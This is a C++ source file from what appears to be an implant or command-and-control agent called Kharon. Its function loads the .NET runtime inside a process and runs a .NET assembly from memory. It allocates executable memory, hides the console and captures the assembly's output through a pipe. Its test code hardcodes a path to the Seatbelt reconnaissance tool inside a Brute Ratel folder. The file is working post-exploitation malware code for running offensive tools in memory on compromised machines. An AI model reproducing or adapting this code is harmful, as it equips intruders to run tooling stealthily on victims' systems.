#include <Kharon.h>

using namespace mscorlib;

auto DECLFN Dotnet::Inline(
    _In_ PBYTE AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    Arguments  = L"";
    AppDomName = L"SystemDomain";
    Version    = L"v4.0.30319";
    KeepLoad   = FALSE;

    HANDLE File = Kh->Krnl32.CreateFileA( 
        "C:\\Users\\obliv\\Downloads\\BruteRatel_1.7.3\\server_confs\\sample_profile_pe\\Seatbelt.exe",
        GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
    );

    AsmLength = Kh->Krnl32.GetFileSize( File, 0 );

    AsmBytes = (PBYTE)Kh->Krnl32.VirtualAlloc( 0, AsmLength, 0x3000, 0x40 );

    ULONG Tmp = 0;
    Kh->Krnl32.ReadFile( File, AsmBytes, AsmLength, &Tmp, 0 );

    KhDbg( "assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    KhDbg( "arguments %S", Arguments );
    KhDbg( "using app domain %S", AppDomName );
    KhDbg( "version: %S", Version );
    KhDbg( "keep enabled: %S", KeepLoad ? "true" : "false" );

    PWCHAR* AsmArgv   = NULL;
    INT     AsmArgc   = 0;
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = NULL;

    SAFEARRAYBOUND SafeBound = { 0 };
    SAFEARRAY*     SafeAsm   = { 0 };
    SAFEARRAY*     SafeExpc  = { 0 };
    SAFEARRAY*	   SafeArgs  = { 0 };

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = { 0 };
    _Assembly*       Assembly    = { 0 };
    _AppDomain*      AppDom      = { 0 };
    _MethodInfo*     MethodInfo  = { 0 };
    IUnknown*        AppDomThunk = { 0 };
    IEnumUnknown*    EnumUkwn    = { 0 };
    ICLRMetaHost*    MetaHost    = { 0 };
    ICLRRuntimeInfo* RtmInfo     = { 0 };
    ICorRuntimeHost* RtmHost     = { 0 };

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    KhDbg( "dbg" );

    HResult = Kh->Mscoree.CLRCreateInstance( 
        Kh->Dot->GUID.xCLSID_CLRMetaHost, Kh->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = MetaHost->GetRuntime( Version, Kh->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = RtmInfo->IsLoadable( &IsLoadable );
    KhDbg( "is loadable: %s", IsLoadable ? "true" : "false" );
    if ( HResult || !IsLoadable ) goto _KH_END;

    HResult = RtmInfo->GetInterface( 
        Kh->Dot->GUID.xCLSID_CorRuntimeHost, Kh->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = RtmHost->Start();
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = AppDomThunk->QueryInterface( Kh->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    SafeBound = { AsmLength, 0 };
    SafeAsm   = Kh->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    KhDbg( "dbg" );

    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _KH_END;

    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );
    
    if ( SafeExpc ) {
        if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
            KhDbg( "dbg" );

            SafeArgs = Kh->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

            if ( Str::LengthW( Arguments ) ) {
                KhDbg( "dbg" );

                AsmArgv = Kh->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
            }

            VariantArgv.parray = Kh->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
            VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );

            for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
                KhDbg( "dbg" );

                Kh->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Kh->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
            }

            KhDbg( "dbg" );
            Kh->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
            KhDbg( "dbg" );

            Kh->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
        }
    }

    KhDbg( "dbg" );

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    KhDbg( "dbg" );

    Kh->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    KhDbg( "dbg" );

    WinHandle = Kh->Krnl32.GetConsoleWindow();

    KhDbg( "dbg" );

    if ( !WinHandle ) {
        Kh->Krnl32.AllocConsole();
        KhDbg( "dbg" );
        if ( !( WinHandle = Kh->Krnl32.GetConsoleWindow() ) ) {
            Kh->User32.ShowWindow( WinHandle, SW_HIDE );
            KhDbg( "dbg" );
        }
    }

    KhDbg( "dbg" );

    BackupOut = Kh->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    KhDbg( "dbg" );
    Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, NULL );
    if ( HResult ) goto _KH_END;

    KhDbg( "dbg" );

    Kh->Dot->Buffer.a = (PCHAR)Kh->Hp->Alloc( PIPE_BUFFER_LENGTH );

    KhDbg( "dbg" );

    Success = Kh->Krnl32.ReadFile( PipeRead, Kh->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Kh->Dot->Buffer.s, 0 );

    KhDbg( "dotnet asm output [%d bytes] %s", Kh->Dot->Buffer.s, Kh->Dot->Buffer.a );

_KH_END:
    if ( HResult ) {    
        KhDbg( "HRESULT: %X", HResult );

        LPSTR errorMessage = NULL;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        // Obtém a mensagem de erro do HRESULT
        DWORD result = Kh->Krnl32.FormatMessageA(
            flags,
            NULL,           // Fonte da mensagem (sistema)
            HResult,             // Código de erro (HRESULT)
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Idioma padrão
            (LPSTR)&errorMessage,  // Buffer de saída (alocado pelo sistema)
            0,             // Tamanho mínimo do buffer
            NULL            // Argumentos (nenhum)
        );
    
        if (result > 0 && errorMessage != NULL) {
            KhDbg("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if (errorMessage != NULL) {
            Kh->Hp->Free(errorMessage, Str::LengthA( errorMessage ) );
        }
    }

    if ( BackupOut ) Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( AsmArgv ) {
        Kh->Hp->Free( AsmArgv, Str::LengthW( *AsmArgv ) ); AsmArgv = NULL;
    }

    if ( SafeAsm ) {
        Kh->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = NULL;
    }

    if ( SafeArgs ) {
        Kh->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = NULL;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}